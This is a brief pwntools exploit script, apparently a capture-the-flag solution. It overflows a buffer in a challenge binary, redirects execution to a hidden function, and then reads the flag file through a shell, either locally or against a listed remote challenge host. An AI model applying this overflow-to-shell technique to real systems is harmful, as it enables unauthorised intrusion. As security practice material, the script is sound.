#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './return'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2118

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

r.sendline(b'A'*0x38 + p64(e.symbols['you_cant_see_this_its_too_evil']+1))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
